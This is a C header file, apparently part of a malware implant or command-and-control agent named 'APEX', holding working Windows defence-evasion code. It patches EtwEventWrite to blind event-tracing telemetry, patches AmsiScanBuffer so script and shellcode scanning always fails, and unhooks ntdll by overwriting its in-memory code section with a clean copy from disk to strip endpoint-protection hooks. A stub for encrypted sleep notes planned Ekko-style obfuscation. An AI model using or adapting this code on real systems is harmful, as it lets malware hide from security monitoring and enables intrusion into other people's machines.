#ifndef APEX_EVASION_H
#define APEX_EVASION_H

#include <windows.h>

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

/* ── ETW Patching ────────────────────────────────────────────
   Patches EtwEventWrite in ntdll.dll to return immediately.
   Blinds ETW-based EDR telemetry (process creation, image load, etc.)
*/
static int patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;
    FARPROC addr = GetProcAddress(ntdll, "EtwEventWrite");
    if (!addr) return -1;
    unsigned char patch[] = { 0x33, 0xC0, 0xC3 }; /* xor eax, eax; ret */
    DWORD old;
    if (!VirtualProtect((LPVOID)addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old))
        return -1;
    memcpy((void*)addr, patch, sizeof(patch));
    VirtualProtect((LPVOID)addr, sizeof(patch), old, &old);
    return 0;
}

/* ── AMSI Patching ───────────────────────────────────────────
   Patches AmsiScanBuffer to always return E_INVALIDARG.
   Defeats AMSI-based script/shellcode scanning.
*/
static int patch_amsi(void) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return 0;
    FARPROC addr = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!addr) return -1;
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; /* mov eax, E_INVALIDARG; ret */
    DWORD old;
    if (!VirtualProtect((LPVOID)addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old))
        return -1;
    memcpy((void*)addr, patch, sizeof(patch));
    VirtualProtect((LPVOID)addr, sizeof(patch), old, &old);
    return 0;
}

/* ── Encrypted Sleep ─────────────────────────────────────────
   DISABLED: SystemFunction032-based section encryption causes
   agent crashes on some Windows builds (MinGW PE layout, section
   alignment, or RC4 state). Use plain Sleep for reliability.
   TODO: Implement proper Ekko via ROP timer callbacks from kernel32.
*/
static void encrypted_sleep(DWORD ms) {
    Sleep(ms);
}

/* ── Self-unhook ntdll ───────────────────────────────────────
   Replaces the in-memory ntdll .text section with a clean copy
   from disk. This removes any EDR hooks on NT APIs.
*/
static int unhook_ntdll(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;

    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                               GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return -1; }

    PVOID cleanNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!cleanNtdll) { CloseHandle(hMap); CloseHandle(hFile); return -1; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            DWORD old;
            VirtualProtect((BYTE*)ntdll + sec[i].VirtualAddress,
                           sec[i].Misc.VirtualSize,
                           PAGE_EXECUTE_READWRITE, &old);
            memcpy((BYTE*)ntdll + sec[i].VirtualAddress,
                   (BYTE*)cleanNtdll + sec[i].VirtualAddress,
                   sec[i].Misc.VirtualSize);
            VirtualProtect((BYTE*)ntdll + sec[i].VirtualAddress,
                           sec[i].Misc.VirtualSize,
                           old, &old);
            break;
        }
    }

    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return 0;
}

#endif /* APEX_EVASION_H */
